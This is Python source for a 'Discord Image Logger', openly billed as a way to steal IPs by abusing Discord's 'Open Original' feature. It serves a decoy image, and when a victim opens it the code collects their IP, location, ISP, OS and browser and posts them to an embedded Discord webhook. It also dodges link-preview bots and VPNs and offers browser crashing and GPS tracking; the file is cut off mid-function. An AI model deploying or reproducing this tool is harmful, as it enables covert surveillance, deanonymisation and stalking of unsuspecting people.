# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1128605102924640256/1P1kMpFElYDFyI2YwIOcX6w7GSXC066Sii_A83RBKG8ta0B9d0IHVbQlHC9rTHY5m1zO",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
